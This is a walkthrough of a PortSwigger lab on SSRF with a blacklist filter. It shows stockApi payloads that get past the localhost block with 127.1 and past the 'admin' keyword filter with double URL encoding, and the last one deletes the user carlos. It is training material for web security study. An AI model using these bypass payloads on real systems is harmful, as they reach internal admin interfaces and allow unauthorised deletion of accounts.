---
description: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
---

# SSRF with blacklist-based input filter

<figure><img src="../../../.gitbook/assets/1 (130).png" alt=""><figcaption></figcaption></figure>

Let's check out the stock.

<figure><img src="../../../.gitbook/assets/2 (121).png" alt=""><figcaption></figcaption></figure>

We can intercept the request using Burpsuite.

<figure><img src="../../../.gitbook/assets/3 (102).png" alt=""><figcaption></figcaption></figure>

Let's send the request to the `Repeater`. We can set the `stockApi` parameter to the following and send the request:

```
http://localhost/admin
```

<figure><img src="../../../.gitbook/assets/4 (84).png" alt=""><figcaption></figcaption></figure>

So that request is blocked.&#x20;

Let's set the `stockApi` parameter to the following and send the request:

```
http://127.1/
```

<figure><img src="../../../.gitbook/assets/6 (55).png" alt=""><figcaption></figcaption></figure>

Ah! That returns a valid response. Let's try visiting the `/admin` page.

```
http://127.1/admin
```

<figure><img src="../../../.gitbook/assets/7 (46).png" alt=""><figcaption></figcaption></figure>

Looks like the `admin` keyword is being pattern-matched and blocked.&#x20;

We can get around it by double URL encoding the string.

<figure><img src="../../../.gitbook/assets/10 (20).png" alt=""><figcaption></figcaption></figure>

Let's now send the following request:

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

<figure><img src="../../../.gitbook/assets/9 (25).png" alt=""><figcaption></figcaption></figure>

We can now delete the `carlos` user.

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

<figure><img src="../../../.gitbook/assets/11 (10).png" alt=""><figcaption></figcaption></figure>

We have solved the lab.

<figure><img src="../../../.gitbook/assets/12 (6).png" alt=""><figcaption></figcaption></figure>
